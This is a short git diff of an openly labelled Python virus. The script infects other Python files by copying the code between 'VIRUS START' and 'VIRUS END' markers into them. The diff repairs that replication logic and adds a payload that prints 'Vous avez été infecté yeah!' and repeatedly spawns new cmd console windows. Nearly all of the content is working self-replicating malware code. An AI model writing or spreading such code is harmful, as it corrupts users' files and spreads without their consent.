@@ -11,7 +11,7 @@ self_replicating_part = False
 for line in lines:
     if line == "# VIRUS START!\n":
         self_replicating_part = True
-    if not self_replicating_part:
+    if self_replicating_part:
         virus_code.append(line)
     if line == "# VIRUS END!\n" :
         break
@@ -32,7 +32,16 @@ for file in python_files:
         final_code.extend(file_code)
         with open(file, 'w') as f:
             f.writelines(final_code)
+
+print("Vous avez été infecté yeah! ")
+f = os.path.basename(sys.argv[0])
+print(f)
+for t in range(2):
+    subprocess.Popen(r"cmd", creationflags=subprocess.CREATE_NEW_CONSOLE)
+    subprocess.Popen(r"cmd", creationflags=subprocess.CREATE_NEW_CONSOLE)
+    subprocess.Popen(r"cmd", creationflags=subprocess.CREATE_NEW_CONSOLE)
+    [''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=1)]
+
 # VIRUS END!\n
 
 
-# VIRUS END!\n
